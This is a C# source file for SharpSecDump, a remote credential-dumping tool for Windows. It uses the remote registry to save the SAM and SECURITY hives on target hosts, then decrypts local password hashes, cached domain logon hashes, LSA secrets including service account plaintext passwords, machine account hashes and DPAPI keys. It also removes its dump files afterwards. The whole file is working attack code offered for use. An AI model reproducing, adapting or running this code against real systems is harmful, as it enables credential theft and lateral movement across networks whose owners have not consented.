using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;


namespace SharpSecDump
{
    class RegQueryValueDemo
    {
        public static List<List<string>> allResults = new List<List<string>>();

        public static void Main(string[] args)
        {
            var comparer = StringComparer.OrdinalIgnoreCase;
            var arguments = new Dictionary<string, string>(comparer);
            int maxThreads = 10;
            int workers, async;

            if (args.Length <= 0 || args[0].ToLower() == "help" || args[0] == "-h" || args[0].ToLower() == "-help")
            {
                Help();
                System.Environment.Exit(0);
            }

            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                {
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                }
            }

            if (!(arguments.ContainsKey("-target")))
            {
                Console.WriteLine("[X] Error '-target' flag required. run with '-help' flag to see additional flags");
                System.Environment.Exit(0);
            }

            if (arguments.ContainsKey("-threads"))
            {
                ThreadPool.GetAvailableThreads(out workers, out async);
                if (System.Convert.ToInt32(arguments["-threads"]) <= workers)
                {
                    maxThreads = System.Convert.ToInt32(arguments["-threads"]);
                }
                else
                {
                    Console.WriteLine("[X] Error - not enough available worker threads in the .net thread pool (max available = " + workers + ")");
                    System.Environment.Exit(0);
                }
            }

            List<String> targetHosts = new List<string>();
            targetHosts = arguments["-target"].Split(',').ToList();
            ThreadPool.SetMaxThreads(maxThreads, 1);
            var count = new CountdownEvent(targetHosts.Count);

            if ((arguments.ContainsKey("-d")) || (arguments.ContainsKey("-u")) || (arguments.ContainsKey("-p")))
            {
                if ((arguments.ContainsKey("-d")) && (arguments.ContainsKey("-u")) && (arguments.ContainsKey("-p")))
                {
                    using (new Impersonation(arguments["-d"], arguments["-u"], arguments["-p"]))
                    {

                        foreach (string singleTarget in targetHosts)
                        {
                            ThreadPool.QueueUserWorkItem(status => { DoStuff(singleTarget); count.Signal(); });
                        }
                        count.Wait();
                    }
                }
                else
                {
                    Console.WriteLine("[X] Error if using alternative credentials, please ensure to include domain, username, and password (use a domain of . for a local account)");
                    System.Environment.Exit(0);
                }
            }
            else
            {
                foreach (string singleTarget in targetHosts)
                {
                    ThreadPool.QueueUserWorkItem(status => { DoStuff(singleTarget); count.Signal(); });
                }
                count.Wait();
            }
            DisplayAllResults();
            Console.WriteLine("---------------Script execution completed---------------");
        }

        private static void DisplayAllResults()
        {
            foreach (List<string> singleHostResults in allResults)
            {
                foreach (string entryLine in singleHostResults)
                {
                    Console.WriteLine(entryLine);
                }
            }
        }

        //tossed all this stuff into a single method to save us from having to duplicate code for the impersonation / non-impersonation options
        private static void DoStuff(string singleTarget)
        {
            RemoteOps remoteConnection = new RemoteOps(singleTarget);
            //this indicates that our initial connection to the remote registry service on the remote target was unsuccessful, so no point in performing any operations
            if (remoteConnection.remoteRegHandle.Equals(IntPtr.Zero))
            {
                return;
            }
            byte[] bootKey = GetBootKey(ref remoteConnection);
            //create names of dump files
            Random rand = new Random();
            string seedVals = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            string randStr = new string(Enumerable.Repeat(seedVals, 16).Select(s => s[rand.Next(s.Length)]).ToArray());
            string samOut = randStr.Substring(0, 8) + ".log";
            string securityOut = randStr.Substring(8, 8) + ".log";
            List<string> singleHostResults = new List<string>
            {
                string.Format("---------------Results from {0}---------------", singleTarget)
            };

            //SAM dump stuff starts here
            string samRemoteLocation = @"\\" + singleTarget + @"\ADMIN$\Temp\" + samOut;
            if (remoteConnection.SaveRegKey("SAM", @"\Windows\Temp\" + samOut))
            {
                RegistryHive sam = remoteConnection.GetRemoteHiveDump(samRemoteLocation);
                if (sam != null)
                {
                    Console.WriteLine("[*] Parsing SAM hive on {0}", singleTarget);
                    singleHostResults.AddRange(ParseSam(bootKey, sam));
                }
                else
                {
                    singleHostResults.Add("[X] Unable to access to SAM dump file");
                }
            }

            //Security dump stuff starts here
            string securityRemoteLocation = @"\\" + singleTarget + @"\ADMIN$\Temp\" + securityOut;
            if (remoteConnection.SaveRegKey("SECURITY", @"\Windows\Temp\" + securityOut))
            {

                RegistryHive security = remoteConnection.GetRemoteHiveDump(securityRemoteLocation);
                if (security != null)
                {
                    Console.WriteLine("[*] Parsing SECURITY hive on {0}", singleTarget);
                    singleHostResults.AddRange(ParseLsa(security, bootKey, ref remoteConnection));
                }
                else
                {
                    singleHostResults.Add("[X] Unable to access to SECURITY dump file");
                }
            }
            remoteConnection.Cleanup(samRemoteLocation, securityRemoteLocation);
            allResults.Add(singleHostResults);
        }

        private static byte[] GetBootKey(ref RemoteOps remoteConnection)
        {
            //the bootkey is stored within the class attribute value of the 4 following keys.  This data is not accessible from regedit.exe, but can be returned from a direct query
            string[] keys = new string[4] { "JD", "Skew1", "GBG", "Data" };
            byte[] transforms = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };
            StringBuilder scrambledKey = new StringBuilder();

            for (int i = 0; i < 4; i++)
            {
                string keyPath = @"SYSTEM\CurrentControlSet\Control\Lsa\" + keys[i];
                IntPtr regKeyHandle = remoteConnection.OpenRegKey(keyPath);
                scrambledKey.Append(remoteConnection.GetRegKeyClassData(regKeyHandle));
                remoteConnection.CloseRegKey(regKeyHandle);
            }
            byte[] scrambled = StringToByteArray(scrambledKey.ToString());
            byte[] unscrambled = new byte[16];
            for (int i = 0; i < 16; i++)
            {
                unscrambled[i] = scrambled[transforms[i]];
            }
            return unscrambled;
        }

        private static byte[] GetHashedBootKey(byte[] bootKey, byte[] fVal)
        {
            byte[] domainData = fVal.Skip(104).ToArray();
            byte[] hashedBootKey;

            //old style hashed bootkey storage
            if (domainData[0].Equals(0x01))
            {
                byte[] f70 = fVal.Skip(112).Take(16).ToArray();
                List<byte> data = new List<byte>();
                data.AddRange(f70);
                data.AddRange(Encoding.ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"));
                data.AddRange(bootKey);
                data.AddRange(Encoding.ASCII.GetBytes("0123456789012345678901234567890123456789\0"));
                byte[] md5 = MD5.Create().ComputeHash(data.ToArray());
                byte[] f80 = fVal.Skip(128).Take(32).ToArray();
                hashedBootKey = Crypto.RC4Encrypt(md5, f80);
            }

            //new version of storage -- Win 2016 / Win 10 (potentially Win 2012) and above
            else if (domainData[0].Equals(0x02))
            {
                byte[] sk_Salt_AES = domainData.Skip(16).Take(16).ToArray();
                int sk_Data_Length = BitConverter.ToInt32(domainData, 12);
                // int offset = BitConverter.ToInt32(v,12) + 204;
                byte[] sk_Data_AES = domainData.Skip(32).Take(sk_Data_Length).ToArray();
                hashedBootKey = Crypto.DecryptAES_CBC(sk_Data_AES, bootKey, sk_Salt_AES);
            }
            else
            {
                Console.WriteLine("[X] Error parsing hashed bootkey");
                return null;
            }
            return hashedBootKey;
        }

        private static List<string> ParseSam(byte[] bootKey, RegistryHive sam)
        {
            List<string> retVal = new List<string>
            {
                "[*] SAM hashes"
            };
            try
            {
                NodeKey nk = GetNodeKey(sam, @"SAM\Domains\Account");
                byte[] fVal = nk.getChildValues("F");
                byte[] hashedBootKey = GetHashedBootKey(bootKey, fVal);
                NodeKey targetNode = nk.ChildNodes.Find(x => x.Name.Contains("Users"));
                byte[] antpassword = Encoding.ASCII.GetBytes("NTPASSWORD\0");
                byte[] almpassword = Encoding.ASCII.GetBytes("LMPASSWORD\0");
                foreach (NodeKey user in targetNode.ChildNodes.Where(x => x.Name.Contains("00000")))
                {
                    byte[] rid = BitConverter.GetBytes(System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber));
                    byte[] v = user.getChildValues("V");
                    int offset = BitConverter.ToInt32(v, 12) + 204;
                    int length = BitConverter.ToInt32(v, 16);
                    string username = Encoding.Unicode.GetString(v.Skip(offset).Take(length).ToArray());

                    //there are 204 bytes of headers / flags prior to data in the encrypted key data structure
                    int lmHashOffset = BitConverter.ToInt32(v, 156) + 204;
                    int lmHashLength = BitConverter.ToInt32(v, 160);
                    int ntHashOffset = BitConverter.ToInt32(v, 168) + 204;
                    int ntHashLength = BitConverter.ToInt32(v, 172);
                    string lmHash = "aad3b435b51404eeaad3b435b51404ee";
                    string ntHash = "31d6cfe0d16ae931b73c59d7e0c089c0";

                    //old style hashes
                    if (v[ntHashOffset + 2].Equals(0x01))
                    {
                        IEnumerable<byte> lmKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(almpassword);
                        byte[] lmHashDecryptionKey = MD5.Create().ComputeHash(lmKeyParts.ToArray());
                        IEnumerable<byte> ntKeyParts = hashedBootKey.Take(16).ToArray().Concat(rid).Concat(antpassword);
                        byte[] ntHashDecryptionKey = MD5.Create().ComputeHash(ntKeyParts.ToArray());
                        byte[] encryptedLmHash = null;
                        byte[] encryptedNtHash = null;


                        if (ntHashLength == 20)
                        {
                            encryptedNtHash = v.Skip(ntHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedNtHashTESTING = Crypto.RC4Encrypt(ntHashDecryptionKey, encryptedNtHash);
                            ntHash = Crypto.DecryptSingleHash(obfuscatedNtHashTESTING, user.Name).Replace("-", "");
                        }
                        if (lmHashLength == 20)
                        {
                            encryptedLmHash = v.Skip(lmHashOffset + 4).Take(16).ToArray();
                            byte[] obfuscatedLmHashTESTING = Crypto.RC4Encrypt(lmHashDecryptionKey, encryptedLmHash);
                            lmHash = Crypto.DecryptSingleHash(obfuscatedLmHashTESTING, user.Name).Replace("-", "");
                        }
                    }
                    //new-style hashes
                    else
                    {
                        byte[] enc_LM_Hash = v.Skip(lmHashOffset).Take(lmHashLength).ToArray();
                        byte[] lmData = enc_LM_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (lmData.Length > 0)
                        {
                            byte[] lmHashSalt = enc_LM_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(lmData, hashedBootKey.Take(16).ToArray(), lmHashSalt).Take(16).ToArray();
                            lmHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                        }

                        byte[] enc_NT_Hash = v.Skip(ntHashOffset).Take(ntHashLength).ToArray();
                        byte[] ntData = enc_NT_Hash.Skip(24).ToArray();
                        //if a hash exists, otherwise we have to return the default string val
                        if (ntData.Length > 0)
                        {
                            byte[] ntHashSalt = enc_NT_Hash.Skip(8).Take(16).ToArray();
                            byte[] desEncryptedHash = Crypto.DecryptAES_CBC(ntData, hashedBootKey.Take(16).ToArray(), ntHashSalt).Take(16).ToArray();
                            ntHash = Crypto.DecryptSingleHash(desEncryptedHash, user.Name).Replace("-", "");
                        }
                    }
                    string ridStr = System.Int32.Parse(user.Name, System.Globalization.NumberStyles.HexNumber).ToString();
                    string hashes = (lmHash + ":" + ntHash);
                    retVal.Add(string.Format("{0}:{1}:{2}", username, ridStr, hashes.ToLower()));
                }
            }
            catch (Exception e)
            {
                retVal.Add("[X] Error parsing SAM dump file: " + e.ToString());
            }
            return retVal;
        }

        private static List<string> ParseLsa(RegistryHive security, byte[] bootKey, ref RemoteOps remoteConnection)
        {
            List<string> retVal = new List<string>();
            try
            {
                byte[] fVal = GetValueKey(security, @"Policy\PolEKList\Default").Data;
                LsaSecret record = new LsaSecret(fVal);
                byte[] dataVal = record.data.Take(32).ToArray();
                byte[] tempKey = Crypto.ComputeSha256(bootKey, dataVal);
                byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
                byte[] decryptedLsaKey = Crypto.DecryptAES_ECB(dataVal2, tempKey).Skip(68).Take(32).ToArray();

                //get NLKM Secret
                byte[] nlkmKey = null;
                NodeKey nlkm = GetNodeKey(security, @"Policy\Secrets\NL$KM");
                if (nlkm != null)
                {
                    retVal.Add("[*] Cached domain logon information(domain/username:hash)");
                    nlkmKey = DumpSecret(nlkm, decryptedLsaKey);
                    foreach (ValueKey cachedLogin in GetNodeKey(security, @"Cache").ChildValues)
                    {
                        if (string.Compare(cachedLogin.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0 && !IsZeroes(cachedLogin.Data.Take(16).ToArray()))
                        {
                            NL_Record cachedUser = new NL_Record(cachedLogin.Data);
                            byte[] plaintext = Crypto.DecryptAES_CBC(cachedUser.encryptedData, nlkmKey.Skip(16).Take(16).ToArray(), cachedUser.IV);
                            byte[] hashedPW = plaintext.Take(16).ToArray();
                            string username = Encoding.Unicode.GetString(plaintext.Skip(72).Take(cachedUser.userLength).ToArray());
                            string domain = Encoding.Unicode.GetString(plaintext.Skip(72 + Pad(cachedUser.userLength) + Pad(cachedUser.domainNameLength)).Take(Pad(cachedUser.dnsDomainLength)).ToArray());
                            domain = domain.Replace("\0", "");
                            retVal.Add(string.Format("{0}/{1}:$DCC2$10240#{2}#{3}", domain, username, username, BitConverter.ToString(hashedPW).Replace("-", "").ToLower()));
                        }
                    }
                }

                try
                {
                    retVal.Add("[*] LSA Secrets");
                    foreach (NodeKey secret in GetNodeKey(security, @"Policy\Secrets").ChildNodes)
                    {
                        if (string.Compare(secret.Name, "NL$Control", StringComparison.OrdinalIgnoreCase) != 0)
                        {
                            if (string.Compare(secret.Name, "NL$KM", StringComparison.OrdinalIgnoreCase) != 0)
                            {
                                LsaSecretBlob secretBlob = new LsaSecretBlob(DumpSecret(secret, decryptedLsaKey));
                                if (secretBlob.length > 0)
                                {
                                    retVal.Add(PrintSecret(secret.Name, secretBlob, ref remoteConnection));
                                }
                            }
                            else
                            {
                                LsaSecretBlob secretBlob = new LsaSecretBlob(nlkmKey);
                                if (secretBlob.length > 0)
                                {
                                    retVal.Add(PrintSecret(secret.Name, secretBlob, ref remoteConnection));
                                }
                            }
                        }
                    }
                }
                catch
                {
                    retVal.Add("[X] No secrets to parse");
                }
            }
            catch (Exception e)
            {
                retVal.Add("[X] Error parsing SECURITY dump file: " + e.ToString());
            }
            return retVal;
        }

        private static int Pad(int data)
        {
            if ((data & 0x3) > 0)
            {
                return (data + (data & 0x3));
            }
            else
            {
                return data;
            }
        }

        private static bool IsZeroes(byte[] inputArray)
        {
            foreach (byte b in inputArray)
            {
                if (b != 0x00)
                {
                    return false;
                }
            }
            return true;
        }

        private static string PrintSecret(string keyName, LsaSecretBlob secretBlob, ref RemoteOps remoteConnection)
        {
            string secretOutput = string.Format("[*] {0}\r\n", keyName);

            if (keyName.ToUpper().StartsWith("_SC_"))
            {
                string startName = remoteConnection.GetServiceStartname(keyName.Substring(4));
                string pw = Encoding.Unicode.GetString(secretBlob.secret.ToArray());
                secretOutput += string.Format("{0}:{1}", startName, pw);
            }
            else if (keyName.ToUpper().StartsWith("$MACHINE.ACC"))
            {
                string computerAcctHash = BitConverter.ToString(Crypto.Md4Hash2(secretBlob.secret)).Replace("-", "").ToLower();
                string domainName = remoteConnection.GetRegistryKeyValue(@"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", "Domain");
                string computerName = remoteConnection.GetRegistryKeyValue(@"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", "Hostname");
                secretOutput += string.Format("{0}\\{1}$:aad3b435b51404eeaad3b435b51404ee:{2}", domainName, computerName, computerAcctHash);
            }
            else if (keyName.ToUpper().StartsWith("DPAPI"))
            {
                secretOutput += ("dpapi_machinekey:" + BitConverter.ToString(secretBlob.secret.Skip(4).Take(20).ToArray()).Replace("-", "").ToLower() + "\r\n");
                secretOutput += ("dpapi_userkey:" + BitConverter.ToString(secretBlob.secret.Skip(24).Take(20).ToArray()).Replace("-", "").ToLower());
            }
            else if (keyName.ToUpper().StartsWith("NL$KM"))
            {
                secretOutput += ("NL$KM:" + BitConverter.ToString(secretBlob.secret).Replace("-", "").ToLower());
            }
            else if (keyName.ToUpper().StartsWith("ASPNET_WP_PASSWORD"))
            {
                secretOutput += ("ASPNET:" + System.Text.Encoding.Unicode.GetString(secretBlob.secret));
            }
            else
            {
                secretOutput += ("[!] Secret type not supported yet - outputing raw secret as unicode:\r\n");
                secretOutput += (System.Text.Encoding.Unicode.GetString(secretBlob.secret));
            }
            return secretOutput;
        }

        private static byte[] DumpSecret(NodeKey secret, byte[] lsaKey)
        {
            NodeKey secretCurrVal = secret.ChildNodes.Find(x => x.Name.Contains("CurrVal"));
            byte[] value = secretCurrVal.getChildValues("Default");
            LsaSecret record = new LsaSecret(value);
            byte[] tempKey = Crypto.ComputeSha256(lsaKey, record.data.Take(32).ToArray());
            byte[] dataVal2 = record.data.Skip(32).Take(record.data.Length - 32).ToArray();
            byte[] plaintext = Crypto.DecryptAES_ECB(dataVal2, tempKey);

            return (plaintext);
        }

        private static byte[] StringToByteArray(string s)
        {
            return Enumerable.Range(0, s.Length)
                .Where(x => x % 2 == 0)
                .Select(x => Convert.ToByte(s.Substring(x, 2), 16))
                .ToArray();
        }

        static NodeKey GetNodeKey(RegistryHive hive, string path)
        {

            NodeKey node = null;
            string[] paths = path.Split('\\');

            foreach (string ch in paths)
            {
                bool found = false;
                if (node == null)
                    node = hive.RootKey;

                foreach (NodeKey child in node.ChildNodes)
                {
                    if (child.Name == ch)
                    {
                        node = child;
                        found = true;
                        break;
                    }
                }
                if (found == false)
                {
                    return null;
                }
            }
            return node;
        }

        static ValueKey GetValueKey(RegistryHive hive, string path)
        {

            string keyname = path.Split('\\').Last();
            path = path.Substring(0, path.LastIndexOf('\\'));

            NodeKey node = GetNodeKey(hive, path);

            return node.ChildValues.SingleOrDefault(v => v.Name == keyname);
        }

        static void Help()
        {
            Console.WriteLine("\n-----------SharpSecDump Info-----------");
            Console.WriteLine("Flag usage:  -Flag=setValue");
            Console.WriteLine("--Required Flags--");
            Console.WriteLine("-target :: comma seperated list of IP's / hostnames to run against.  Please dont include spaces between addresses");
            Console.WriteLine("--Optional Flags--");
            Console.WriteLine("-u :: Username to use, if not running in current user's context. Must use with -P and -D flags");
            Console.WriteLine("-p :: Plaintext password to use, if not running in current user's context. Must use with -U and -D flags");
            Console.WriteLine("-d :: Domain to use, if not running in current user's context (. for local). Must use with -U and -P flags");
            Console.WriteLine("-threads :: Threads to use to concurently enumerate multiple remote hosts (Default: 10)");
            Console.WriteLine("--Example Format--");
            Console.WriteLine("SharpSecDump.exe -target=192.168.1.15 -u=admin -p=Password123 -d=test.local");
        }
    }
}
